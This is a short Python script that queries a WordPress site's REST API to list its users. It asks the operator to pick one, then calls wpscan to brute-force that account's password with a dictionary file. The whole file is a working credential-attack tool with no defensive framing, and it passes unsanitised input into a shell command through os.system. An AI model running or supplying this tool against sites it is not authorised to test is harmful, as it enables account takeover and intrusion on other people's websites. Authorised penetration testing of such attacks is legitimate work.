import requests
import os


url = str(input("input wordpress site: "))
joint = url + "/wp-json/wp/v2/users"

two = requests.get(joint)
length = len(two.json())


for x in range(length):
    data = two.json()[x]['name']
    print(data)

number = int(input('select the username:'))
show = two.json()[number]['name']
print(show)

dictpath = str(input("input dictionary path and file: "))

comando = 'wpscan --url '+url+' --passwords '+dictpath+' --usernames '+ show

os.system(comando)